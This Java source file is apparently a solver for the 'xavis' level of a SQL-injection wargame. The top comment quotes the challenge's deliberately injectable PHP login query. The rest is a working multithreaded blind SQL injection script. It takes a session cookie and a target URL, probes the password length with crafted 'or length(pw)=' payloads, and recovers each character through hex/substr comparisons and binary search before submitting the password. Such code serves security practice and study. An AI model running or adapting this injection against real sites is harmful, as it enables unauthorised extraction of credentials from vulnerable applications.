import java.io.*;
import java.util.*;
import java.net.*;
/*  ====P-R-O-B-L-E-M====
 * 
 * <?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
 * 
 */


public class Xavis
implements Runnable
{
	HttpURLConnection conn=null;
	public static String getContent(InputStream ism) throws IOException{
		StringBuffer sb = new StringBuffer();
		//BufferedReader br = new BufferedReader(new BufferedInputStream(ism));
		DataInputStream dis = new DataInputStream(ism);
		String l;
		while((l=dis.readLine())!=null){
			sb.append(l);
		}
		dis.close();

		final String result = sb.toString();
		sb=null;
		return result;
	}
	public static String queryContent(Configure conf,String sub_query)throws Exception{
		return queryContent(conf,conf.getCookieContent(),sub_query);
	}
	public static String queryContent(Configure conf,String cookie_content,String sub_query) throws Exception{
		HttpURLConnection conn =(HttpURLConnection) new URL(conf.getURL()+sub_query).openConnection();
		//conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36");
		conn.addRequestProperty("Cookie",cookie_content);
		conn.connect();
		InputStream ism = conn.getInputStream();
		final String content = getContent(ism);
		ism.close();
		conn.disconnect();
		conn=null;
		return content;
	}
	public static boolean isSuccess(String resp,String[] acclst){
		boolean rst = false;
		for(String acc:acclst){
			rst = rst||resp.contains("<h2>Hello "+acc);
			if(rst){
				break;
			}
		}
		return rst;
	}

	public static boolean isSuccess(String resp){
		return isSuccess(resp,new String[]{"guest","Guest","Admin","admin"});
	}
	public static boolean isSuccessAndIsClear(String resp){
		return isSuccess(resp)&&resp.contains(" Clear!");
	}
	protected void saveListOnFile(File f,int pos,ArrayList<String> lst) throws Exception{
		OutputStream osm = new FileOutputStream(f);
		ObjectOutputStream dos = new ObjectOutputStream(osm);
		dos.writeInt(pos);
		dos.flush();
		dos.writeObject(lst);
		dos.flush();
		dos.close();
		osm.close();
	}
	public void run(){
		Configure conf = new Configure();
		if(conf.getToken().equals("exit")){
			return;
		}

		try{
			final String cookie_content = "PHPSESSID="+conf.getToken()+";";
			int pwlen=-1;
			String content="";
			int lenhelper = 1;
			while(pwlen==-1){
				String sub_query = "?"+String.format("pw=%%27%%20or%%20length(pw)=%d%%20%s%%23",lenhelper,URLEncoder.encode(" and id='admin' "));
				content=queryContent(conf,cookie_content,sub_query);
				
				if(isSuccess(content)){
					pwlen=(lenhelper);
					pwlen=lenhelper;
					
				}
				else{
					lenhelper++;
				}
			}
			System.out.println(String.format("::password length is %d",pwlen));
			System.out.printf("we will loop %d times for single byte unicode data belong string data\n",pwlen);
			String passwd = "none";
			 final char[] aa=new char[pwlen];
			 Thread[] ths = new Thread[aa.length]; //if password length is over 50,I suggest you to use ThreadPoolExecutor instead of this variable
			 
			 for(int i=0;i<aa.length;i++){
				 ths[i] = new SearchThread(i,aa,conf);
				 ths[i].start();
				 
			 }
			 for(int i=0;i<ths.length;i++){
				 ths[i].join();
			 }
			 passwd="";
			 int realpwlen = 0;
			 for(int i =0;i<aa.length;i++){
				 char a = aa[i];
				 if(a>0){
					 realpwlen=i+1;
				 }
				 System.out.println("found:: '"+String.valueOf(a)+"' "+(int)a);
			 }
			 char[] ttt = new char[realpwlen];
				for(int i=0;i<ttt.length;i++){
					ttt[i]=aa[i];
				}
				String dt = new String(ttt);
			passwd = dt; //new String(aa,"utf-8");
			System.out.println(String.format("password is '%s'",passwd));
			System.out.println(String.format("password is '%s'",URLEncoder.encode( passwd)));
			Scanner sc = new Scanner(System.in);
			System.out.print("would you want to clear this level on this program?[y/n] ");
			
			final String resp = sc.next();
			if(resp.equals("y")||resp.equals("Y")){
				
				System.out.println("applying...");
								String sub_query = "?"+String.format("pw=%s",dt);
				content=queryContent(conf,cookie_content,sub_query);
				
				if(isSuccessAndIsClear(content)){
				System.out.println("Stage Clear!");
				}else{
					 sub_query = "?"+String.format("pw=%s",URLEncoder.encode( dt));
				content=queryContent(conf,cookie_content,sub_query);
				
				if(isSuccessAndIsClear(content)){
					System.out.println("Stage Clear!");
				}else{//tested on only mac (java ver 1.8.91)
					System.out.println("failed...(please apply on another java environment , and Integer Numbers in found:: logs are accurate data.)");
				}
				}
			}
			
		}catch(Exception e){
			e.printStackTrace(System.out);
		}
	}
protected class SearchThread extends Thread{
	protected Configure conf;
	protected char[] aa;
	protected int i;
	private String content;
	public SearchThread(int i,char[] aa,Configure conf){
		this.aa=aa;
		this.conf=conf;
		this.i = i;
	}
@Override
public void run(){
	try{
					 int maxv = 1;
				 final String query_format = "pw='%%20or%%20conv(hex(substr(pw,%d,1)),%%2016,%%2010)%s%d%%20%s";
					while(true){
					String sub_query = "?"+String.format(query_format,i+1,"%3E",maxv,URLEncoder.encode(" and id='admin"));
					content = queryContent(conf,sub_query);
					if(isSuccess(content)){
						maxv*=2;
					}
					else{
						break;
					}}
					int minv = maxv/2;
					//System.out.printf("range(%d, %d)\n",minv,maxv);
					int minrange = minv;
					int maxrange = maxv;
					//for(int j=minv;j<=maxv;j++){
					boolean isFound = true;
					
					int j=0;
					while( 0<minrange&&minrange<=maxrange){
						
						 j = (minrange+maxrange)/2;
						String sub_query = "?"+String.format(query_format,i+1,"<",j,URLEncoder.encode(" and id='admin"));
						content = queryContent(conf,sub_query);
						if((isFound=isSuccess(content))){
							maxrange=j;
						}
						else{
							if(minrange!=j){
							minrange=j;
							}
							else{
								aa[i]=(char)minrange;
								break;
							}
						}
						
					}
	}catch(Exception e){e.printStackTrace(System.out);}
			 
}
	
}
	public static void main(String... args){
		try{
		Runnable bi = (Runnable) Class.forName(Thread.currentThread().getStackTrace()[1].getClassName()).newInstance(); // new BlindInjection3();//getClass().newInstance();
		System.out.println( Thread.currentThread().getStackTrace()[1].getClassName());
		Thread th = new Thread(bi);
		th.start();
		try{
			th.join();}catch(Exception e2){}
		}catch(Exception e){}
		
		System.out.println("program finish");
	}
protected static class Configure{
		protected String token="",mUrl="";
		public String setToken(String tk){
			token=tk;
			return tk;
		}
		public String setURL(String url){
			mUrl=url;
			return url;
		}
		public String getURL(){
			return mUrl;
		}
		public String getToken(){
			return token;
		
		}
		public String getCookieContent(){
			return  "PHPSESSID="+getToken()+";";
		}
		public final static String file_version = "3.0";
		public Configure(){
			Scanner sc = new Scanner(System.in);
			System.out.println("File Version= "+file_version);
			System.out.print("input session tokenqqq: ");
			String ans = sc.next();
			setToken(ans);
			System.out.print("input url: ");
			setURL(sc.next());
			System.out.println();
            
		}
	}
}
